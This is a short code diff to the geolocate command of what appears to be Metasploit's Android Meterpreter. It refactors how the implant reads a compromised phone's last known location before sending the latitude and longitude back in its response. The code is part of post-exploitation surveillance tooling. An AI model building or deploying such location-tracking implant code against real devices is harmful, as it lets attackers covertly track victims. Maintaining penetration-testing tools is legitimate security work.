@@ -5,6 +5,7 @@ import android.location.Location;
 import android.location.LocationManager;
 
 import com.metasploit.meterpreter.AndroidMeterpreter;
+import com.metasploit.meterpreter.LocationUtils;
 import com.metasploit.meterpreter.Meterpreter;
 import com.metasploit.meterpreter.TLVPacket;
 import com.metasploit.meterpreter.command.Command;
@@ -20,13 +21,7 @@ public class geolocate_android implements Command {
     @Override
     public int execute(Meterpreter meterpreter, TLVPacket request,
                        TLVPacket response) throws Exception {
-
-        LocationManager locationManager;
-        locationManager = (LocationManager) AndroidMeterpreter.getContext()
-                .getSystemService(Context.LOCATION_SERVICE);
-        Location location = locationManager
-                .getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
-
+        Location location = LocationUtils.getLastLocation(AndroidMeterpreter.getContext());
         if (location != null) {
             response.add(TLV_TYPE_GEO_LAT,
                     Double.toString(location.getLatitude()));
